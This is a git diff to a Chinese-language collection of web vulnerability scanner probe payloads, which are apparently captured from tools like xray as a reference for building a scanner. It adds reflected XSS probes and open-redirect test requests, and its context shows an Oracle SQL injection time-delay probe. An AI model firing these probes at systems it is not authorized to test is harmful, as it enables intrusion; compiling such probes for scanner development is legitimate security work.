@@ -1,6 +1,6 @@
 # WEB 漏扫 payload 收集
 
-从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考
+从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考，payload 中的无规律字符和均为 payload 随机生成
 
 漏洞检测基本原则：
 - 随机性
@@ -62,8 +62,28 @@ form=submit'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('k',2)='k
 ```
 
 ### XSS
+xray 的 xss payload会根据输出点上下文做相应的检测， DOM 型 xss 仅企业版支持，无法获取测试 payload。
+#### 反射型
+```
+# 输出点在 <script> 中
+form=%27-mvhqgcrz-%27
+form=%3C%2FScRiPt%3E%3Cvftwqvrtvc%3E
+
+# 输出点在普通 DOM 节点下
+form=%3Cxckjeiptrr%3E
+%3CsCrIpT%3Exckjeiptrr%3C%2FsCrIpT%3E
+```
 
 ### 任意跳转检测
+
+```
+GET //127.0.0.1.yg1d.com
+GET /redirect.php?url=http://127.0.0.1.eukh.com#@127.0.0.1/aaa
+GET /redirect.php?url=//127.0.0.1.eukh.com#@127.0.0.1/aaa
+GET /redirect.php?url=http:127.0.0.1.nnv9.com#@127.0.0.1/aaa
+GET /redirect.php?url=3ekv.com
+GET /redirect.php?url=https:16843009
+```
 
 ### 路径穿越检测
 
